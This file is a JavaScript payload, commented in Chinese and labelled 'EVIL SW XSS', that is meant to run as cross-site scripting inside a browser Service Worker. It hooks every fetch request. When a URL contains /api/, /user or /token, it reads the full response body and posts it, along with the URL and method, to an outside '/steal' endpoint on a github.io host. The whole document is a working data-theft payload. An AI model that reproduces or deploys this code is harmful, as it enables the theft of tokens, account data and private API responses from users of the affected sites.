/**
 * 在 Service Worker 内部执行的 XSS
 * 直接 Hook 当前 SW 的所有功能
 */

(function() {
    const PREFIX = '🚨 [EVIL SW XSS]';
    
    console.log(PREFIX, 'XSS executing inside Service Worker!');
    console.log(PREFIX, 'Current scope:', self.registration.scope);
    
    // ============================================
    // 1. 直接添加 fetch 监听器
    // ============================================
    self.addEventListener('fetch', (event) => {
        const url = event.request.url;
        const method = event.request.method;
        
        console.log(PREFIX, '');
        console.log(PREFIX, '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
        console.log(PREFIX, '🚀 FETCH INTERCEPTED');
        console.log(PREFIX, '  URL:', url);
        console.log(PREFIX, '  Method:', method);
        
        // 检测敏感请求
        if (url.includes('/api/') || url.includes('/user') || url.includes('/token')) {
            console.log(PREFIX, '⚠️ SENSITIVE REQUEST!');
            
            event.respondWith(
                (async () => {
                    const response = await fetch(event.request);
                    const clonedResponse = response.clone();
                    
                    try {
                        const body = await clonedResponse.text();
                        console.log(PREFIX, '📦 Response:', body.substring(0, 500));
                        
                        // 发送到攻击者
                        fetch('https://johnstonemees.github.io/steal', {
                            method: 'POST',
                            body: JSON.stringify({
                                url: url,
                                method: method,
                                response: body,
                                timestamp: Date.now()
                            }),
                            mode: 'no-cors'
                        });
                    } catch (e) {}
                    
                    return response;
                })()
            );
        }
    });
    
    console.log(PREFIX, '✅ Fetch listener added!');
    
})();
